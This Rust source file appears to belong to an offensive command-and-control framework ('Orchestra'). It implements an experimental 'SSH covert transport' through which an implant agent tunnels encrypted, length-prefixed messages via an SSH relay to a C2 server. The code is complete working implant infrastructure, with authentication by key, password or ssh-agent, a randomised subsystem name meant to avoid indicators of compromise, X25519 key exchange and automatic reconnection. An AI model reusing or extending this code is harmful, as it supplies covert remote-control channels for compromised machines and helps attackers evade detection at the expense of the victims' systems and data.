// Requires russh >= 0.46
//! SSH covert transport for the Orchestra agent.
//!
//! # Status: EXPERIMENTAL - not recommended for production use.
//! Enabled only when built with `--features ssh-transport`.
//!
//! This module implements a [`Transport`] that tunnels agent messages through
//! an SSH session channel.  The connection flow is:
//!
//! ```text
//! agent  ──SSH──►  relay SSH server  ──subsystem <IOC_SSH_SUBSYSTEM>──►  C2 session
//! ```
//!
//! The relay SSH server must be configured to accept the compile-time randomised
//! subsystem (see `common::ioc::IOC_SSH_SUBSYSTEM`) and forward the raw byte
//! stream to the Orchestra server's agent listener.  A minimal `sshd_config`
//! stanza is:
//!
//! ```text
//! Subsystem <IOC_SSH_SUBSYSTEM> /usr/local/bin/orchestra-ssh-forwarder
//! ```
//!
//! ## Framing
//!
//! SSH channels are stream-oriented.  This transport wraps every message in a
//! 4-byte big-endian length prefix so the receiver can reconstruct frame
//! boundaries:
//!
//! ```text
//! [ 4 bytes: payload length (u32, big-endian) ] [ payload: encrypted bytes ]
//! ```
//!
//! ## Authentication
//!
//! Supports three modes (configured via `MalleableProfile::ssh_auth`):
//!
//! * `Key`      — loads a PEM/OpenSSH private key from a filesystem path.
//! * `Password` — plain password authentication (use only when necessary).
//! * `Agent`    — uses identities loaded in the local ssh-agent via
//!                `SSH_AUTH_SOCK`.
//!
//! ## Reconnection
//!
//! `SshTransport` does not reconnect internally.  Errors from `send` or `recv`
//! propagate to `outbound::run_forever`, which restarts the entire transport
//! stack with exponential back-off (same behaviour as the TLS transport).

use anyhow::{anyhow, Result};
use async_trait::async_trait;
use common::config::{MalleableProfile, SshAuthConfig};
use common::{CryptoSession, Message, Transport};
use log::info;
use russh::client;
use russh_keys::key::PublicKey;
use std::sync::Arc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::time::Duration;

// Maximum acceptable frame payload size: 16 MiB.  Rejects corrupt or
// malicious length fields without allocating unbounded memory.
const MAX_FRAME_BYTES: usize = 16 * 1024 * 1024;

// ── SSH client handler ────────────────────────────────────────────────────────

/// [`client::Handler`] that optionally pins the server host key by its
/// SHA-256 fingerprint stored in `MalleableProfile.ssh_host_key_fingerprint`.
///
/// * When `allowed_host_key` is `Some(fp)` the connection is rejected if the
///   server's public key fingerprint does not match `fp` (MITM protection).
/// * When `allowed_host_key` is `None` the key is accepted but a warning is
///   logged so operators know pinning is not active.
struct ClientHandler {
    /// Expected hex SHA-256 fingerprint, or `None` to accept any key.
    allowed_host_key: Option<String>,
}

#[async_trait]
impl client::Handler for ClientHandler {
    type Error = anyhow::Error;

    async fn check_server_key(
        &mut self,
        server_public_key: &PublicKey,
    ) -> Result<bool, Self::Error> {
        let fingerprint = server_public_key.fingerprint();
        match &self.allowed_host_key {
            Some(expected) => {
                if fingerprint == *expected {
                    Ok(true)
                } else {
                    log::error!(
                        "ssh-transport: host key fingerprint mismatch \
                         (expected {expected}, got {fingerprint}) — rejecting connection"
                    );
                    Ok(false)
                }
            }
            None => {
                log::warn!(
                    "ssh-transport: no host key fingerprint configured; \
                     accepting server key {fingerprint} without verification"
                );
                Ok(true)
            }
        }
    }
}

// ── Transport struct ──────────────────────────────────────────────────────────

/// SSH-tunnelled Orchestra transport.
///
/// Wraps a `russh` client session channel.  Each [`send`] / [`recv`] call
/// exchanges a single length-prefixed, AES-256-GCM-encrypted frame.
///
/// P1-05: Session keys are now derived via an X25519 ECDH exchange
/// authenticated by the PSK, providing forward secrecy.  If the PSK is
/// compromised in the future, past sessions remain protected because the
/// ephemeral private keys are erased after the exchange.
pub struct SshTransport {
    /// Keeps the underlying SSH session alive for the transport's lifetime.
    session: client::Handle<ClientHandler>,
    /// The session channel carrying Orchestra frames, wrapped as an
    /// `AsyncRead + AsyncWrite` stream.
    stream: russh::ChannelStream<client::Msg>,
    /// Application-layer symmetric session (AES-256-GCM).
    crypto_session: CryptoSession,
    /// Malleable profile for future re-connections and configuration access.
    #[allow(dead_code)]
    profile: MalleableProfile,
    /// Pre-shared key retained for channel re-opening (ECDH key exchange).
    psk: Vec<u8>,
    /// Partial-frame accumulation buffer.  SSH data arrives in arbitrary
    /// chunks; frames are only consumed once a complete length-prefixed
    /// payload is buffered.
    recv_buf: Vec<u8>,
}

impl SshTransport {
    /// Connect to the SSH relay, authenticate, and open a session channel
    /// requesting the compile-time randomised subsystem.
    /// The subsystem name is defined in `common::ioc::IOC_SSH_SUBSYSTEM`.
    ///
    /// P1-05: After the SSH channel is established, an X25519 ECDH key
    /// exchange authenticated by the PSK is performed over the channel to
    /// derive a forward-secret session key.  This ensures that a future PSK
    /// compromise does not allow decryption of past sessions.
    ///
    /// Returns an error if:
    /// * `ssh_host` / `ssh_username` / `ssh_auth` are absent from the profile.
    /// * Authentication fails.
    /// * The server rejects the subsystem request.
    /// * The ECDH key exchange fails (PSK mismatch, MITM, etc.).
    pub async fn new(profile: &MalleableProfile, psk: &[u8]) -> Result<Self> {
        let host = profile
            .ssh_host
            .as_deref()
            .filter(|s| !s.is_empty())
            .ok_or_else(|| anyhow!("ssh-transport: ssh_host not configured in malleable profile"))?;

        let port = profile.ssh_port.unwrap_or(22);

        let username = profile
            .ssh_username
            .as_deref()
            .filter(|s| !s.is_empty())
            .ok_or_else(|| {
                anyhow!("ssh-transport: ssh_username not configured in malleable profile")
            })?;

        let auth_cfg = profile
            .ssh_auth
            .as_ref()
            .ok_or_else(|| anyhow!("ssh-transport: ssh_auth not configured in malleable profile"))?;

        // Build a conservative client config: 5-minute inactivity timeout,
        // keepalive every 60 seconds so NAT mappings stay alive.
        let ssh_config = Arc::new(client::Config {
            inactivity_timeout: Some(Duration::from_secs(300)),
            keepalive_interval: Some(Duration::from_secs(60)),
            keepalive_max: 5,
            ..<_>::default()
        });

        let addr = format!("{host}:{port}");
        info!("ssh-transport: connecting to {addr}");
        let handler = ClientHandler {
            allowed_host_key: profile.ssh_host_key_fingerprint.clone(),
        };
        let mut handle = client::connect(ssh_config, addr.as_str(), handler).await?;

        // Authenticate according to the configured method.
        let authenticated = match auth_cfg {
            SshAuthConfig::Password { password } => handle
                .authenticate_password(username, password.as_str())
                .await
                .map_err(|e| anyhow!("ssh-transport: password auth error: {e}"))?,

            SshAuthConfig::Key { key_path } => {
                let key_pair = russh_keys::load_secret_key(key_path, None)
                    .map_err(|e| anyhow!("ssh-transport: failed to load key '{key_path}': {e}"))?;
                handle
                    .authenticate_publickey(username, Arc::new(key_pair))
                    .await
                    .map_err(|e| anyhow!("ssh-transport: public-key auth error: {e}"))?
            }

            SshAuthConfig::Agent => {
                let mut agent_client = russh_keys::agent::client::AgentClient::connect_env()
                    .await
                    .map_err(|e| match e {
                        russh_keys::Error::EnvVar("SSH_AUTH_SOCK") => anyhow!(
                            "ssh-transport: ssh-agent auth requires SSH_AUTH_SOCK to be set and a running ssh-agent; start ssh-agent and load a key with ssh-add"
                        ),
                        russh_keys::Error::BadAuthSock => anyhow!(
                            "ssh-transport: ssh-agent auth requires a reachable socket at SSH_AUTH_SOCK; start ssh-agent and ensure SSH_AUTH_SOCK points to the agent socket"
                        ),
                        other => anyhow!("ssh-transport: failed to connect to ssh-agent: {other}"),
                    })?;

                let identities = agent_client
                    .request_identities()
                    .await
                    .map_err(|e| anyhow!("ssh-transport: failed to enumerate ssh-agent identities: {e}"))?;

                if identities.is_empty() {
                    return Err(anyhow!(
                        "ssh-transport: ssh-agent is reachable but has no identities loaded; add a key with ssh-add"
                    ));
                }

                let mut authenticated_via_agent = false;

                for key in identities {
                    let fingerprint = key.fingerprint();
                    let (next_client, auth_result) = handle
                        .authenticate_future(username, key, agent_client)
                        .await;
                    agent_client = next_client;

                    match auth_result {
                        Ok(true) => {
                            info!(
                                "ssh-transport: ssh-agent authentication succeeded with identity {fingerprint}"
                            );
                            authenticated_via_agent = true;
                            break;
                        }
                        Ok(false) => {
                            log::debug!(
                                "ssh-transport: ssh-agent identity {fingerprint} was rejected by server"
                            );
                        }
                        Err(e) => {
                            log::debug!(
                                "ssh-transport: ssh-agent identity {fingerprint} failed during authentication: {e}"
                            );
                        }
                    }
                }

                authenticated_via_agent
            }
        };

        if !authenticated {
            return Err(anyhow!(
                "ssh-transport: authentication rejected for user '{username}' at {addr}"
            ));
        }

        info!("ssh-transport: authenticated as '{username}', opening session channel");
        let channel = handle.channel_open_session().await?;

        // Request the compile-time randomised subsystem.  The relay sshd must
        // map this subsystem to a process or socket that speaks the Orchestra
        // agent protocol (length-prefixed AES-GCM frames).
        channel
            .request_subsystem(true, common::ioc::IOC_SSH_SUBSYSTEM)
            .await
            .map_err(|e| anyhow!("ssh-transport: subsystem '{}' rejected: {e}", common::ioc::IOC_SSH_SUBSYSTEM))?;

        info!("ssh-transport: session channel ready, performing X25519 ECDH key exchange");

        // P1-05: Convert the channel into an AsyncRead + AsyncWrite stream
        // and perform an X25519 ECDH key exchange to derive a forward-secret
        // session key, rather than using the PSK directly.
        let mut stream = channel.into_stream();
        let crypto_session = common::forward_secrecy::negotiate_session_key(
            &mut stream,
            psk,
            true, // client sends first
        )
        .await
        .map_err(|e| anyhow!("ssh-transport: ECDH key exchange failed: {e}"))?;

        info!("ssh-transport: forward-secret session established");

        Ok(Self {
            session: handle,
            stream,
            crypto_session,
            profile: profile.clone(),
            psk: psk.to_vec(),
            recv_buf: Vec::new(),
        })
    }

    /// Re-open a session channel on the existing authenticated handle.
    ///
    /// Called internally after a channel close without a full SSH reconnect.
    /// If the handle itself has closed, the caller should discard the whole
    /// transport and let `outbound::run_forever` rebuild it.
    ///
    /// P1-05: Re-opening also re-performs the X25519 ECDH key exchange so
    /// each channel gets a fresh forward-secret session key.
    async fn reopen_channel(&mut self) -> Result<()> {
        if self.session.is_closed() {
            return Err(anyhow!("ssh-transport: session closed, cannot reopen channel"));
        }
        let channel = self.session.channel_open_session().await?;
        channel
            .request_subsystem(true, common::ioc::IOC_SSH_SUBSYSTEM)
            .await
            .map_err(|e| anyhow!("ssh-transport: subsystem '{}' reopen rejected: {e}", common::ioc::IOC_SSH_SUBSYSTEM))?;

        // Convert to stream and perform a fresh ECDH exchange.
        let mut stream = channel.into_stream();
        self.crypto_session = common::forward_secrecy::negotiate_session_key(
            &mut stream,
            &self.psk,
            true,
        )
        .await
        .map_err(|e| anyhow!("ssh-transport: ECDH key exchange on reopen failed: {e}"))?;

        self.stream = stream;
        self.recv_buf.clear();

        info!("ssh-transport: channel reopened successfully");
        Ok(())
    }
}

// ── Transport implementation ──────────────────────────────────────────────────

#[async_trait]
impl Transport for SshTransport {
    /// Serialize, encrypt, and write a length-prefixed frame to the channel.
    ///
    /// If the channel has been closed (e.g. by the relay sshd restarting),
    /// attempts to re-open it via [`reopen_channel`] before failing, avoiding
    /// a full transport teardown for channel-level errors.
    async fn send(&mut self, msg: Message) -> Result<()> {
        let serialized = bincode::serialize(&msg)?;
        let ciphertext = self.crypto_session.encrypt(&serialized);

        // 4-byte big-endian length prefix followed by ciphertext payload.
        let payload_len = ciphertext.len() as u32;
        let mut frame = Vec::with_capacity(4 + ciphertext.len());
        frame.extend_from_slice(&payload_len.to_be_bytes());
        frame.extend_from_slice(&ciphertext);

        // Write the frame using AsyncWrite on the ChannelStream.
        match self.stream.write_all(&frame).await {
            Ok(()) => Ok(()),
            Err(e) => {
                log::info!(
                    "ssh-transport: send failed ({e:#}), attempting channel reopen"
                );
                self.reopen_channel().await?;
                // Retry the write on the fresh channel.
                self.stream
                    .write_all(&frame)
                    .await
                    .map_err(|e| anyhow!("ssh-transport: send failed after reopen: {e}"))?;
                Ok(())
            }
        }
    }

    /// Read from the stream, accumulating data until a complete
    /// length-prefixed frame arrives, then decrypt and deserialize it.
    ///
    /// If the channel is closed (EOF) or the read fails with a channel-level
    /// error, attempts to re-open it via [`reopen_channel`] before failing,
    /// avoiding a full transport teardown for channel-level errors.  Only
    /// if the SSH session itself is dead does the error propagate to
    /// `outbound::run_forever` for a full reconnect.
    async fn recv(&mut self) -> Result<Message> {
        loop {
            // Attempt to parse a complete frame from the accumulation buffer.
            if self.recv_buf.len() >= 4 {
                let payload_len = u32::from_be_bytes([
                    self.recv_buf[0],
                    self.recv_buf[1],
                    self.recv_buf[2],
                    self.recv_buf[3],
                ]) as usize;

                if payload_len > MAX_FRAME_BYTES {
                    // Clear the buffer to avoid holding corrupted state.
                    self.recv_buf.clear();
                    return Err(anyhow!(
                        "ssh-transport: frame too large ({payload_len} bytes); \
                         possible framing desync or corrupt stream"
                    ));
                }

                if self.recv_buf.len() >= 4 + payload_len {
                    let frame: Vec<u8> = self.recv_buf[4..4 + payload_len].to_vec();
                    self.recv_buf.drain(..4 + payload_len);

                    let plaintext = self.crypto_session.decrypt(&frame)?;
                    let message: Message = bincode::deserialize(&plaintext)?;
                    return Ok(message);
                }
            }

            // Need more bytes — read from the ChannelStream into the buffer.
            let mut tmp = [0u8; 8192];
            match self.stream.read(&mut tmp).await {
                Ok(0) => {
                    // Channel EOF — attempt reopen before giving up.
                    log::info!("ssh-transport: channel EOF received, attempting reopen");
                    match self.reopen_channel().await {
                        Ok(()) => continue, // Channel reopened, keep receiving.
                        Err(e) => {
                            return Err(anyhow!(
                                "ssh-transport: channel EOF and reopen failed: {e}"
                            ));
                        }
                    }
                }
                Ok(n) => {
                    self.recv_buf.extend_from_slice(&tmp[..n]);
                }
                Err(e) => {
                    // Read error — attempt reopen before giving up.
                    log::info!(
                        "ssh-transport: recv read error ({e:#}), attempting channel reopen"
                    );
                    match self.reopen_channel().await {
                        Ok(()) => continue, // Channel reopened, keep receiving.
                        Err(reopen_err) => {
                            return Err(anyhow!(
                                "ssh-transport: recv failed ({e}) and reopen failed: {reopen_err}"
                            ));
                        }
                    }
                }
            }
        }
    }
}

impl Drop for SshTransport {
    fn drop(&mut self) {
        // Best-effort clean shutdown; ignore errors (we're in Drop).
        // The tokio runtime may already be shutting down, so we cannot
        // await.  russh will close the connection on Handle drop.
        let _ = &self.session;
    }
}

// ── Reconnection helper (used by outbound.rs) ─────────────────────────────────

/// Build a fresh [`SshTransport`] from the malleable profile.
///
/// Called by [`crate::outbound::build_outbound_transport`] when the
/// `ssh-transport` feature is enabled and `ssh_host` is configured.
///
/// P1-05: The PSK is no longer used directly as the session key.
/// Instead, an X25519 ECDH key exchange is performed over the SSH
/// channel to derive a forward-secret session key.
pub async fn new_transport(
    profile: &MalleableProfile,
    secret: &str,
) -> Result<SshTransport> {
    SshTransport::new(profile, secret.as_bytes()).await
}
